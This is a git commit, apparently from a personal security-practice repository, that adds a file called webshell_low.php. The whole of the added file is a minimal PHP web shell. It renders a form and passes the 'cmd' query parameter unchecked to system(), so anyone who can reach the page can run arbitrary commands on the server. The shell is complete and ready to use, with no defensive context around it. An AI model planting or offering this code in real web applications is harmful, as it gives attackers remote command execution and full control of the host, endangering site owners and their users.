2d7e712aff5f4e6ecece8b709e0c92bfceaccd96
Roronoawjd <2jw2534@gmail.com>
2023-06-29 15:44:32 +0900

    webshell low level

---
+++ webshell_low.php
@@ -0,0 +1,11 @@
+<?php
+    echo 'Enter a Command:<br>';
+    echo '<form action="">';
+    echo '<input type=text name="cmd">';
+    echo '<input type="submit">';
+    echo '</form>';
+
+    if(isset($_GET['cmd'])){
+        system($_GET['cmd']);
+    }
+?>
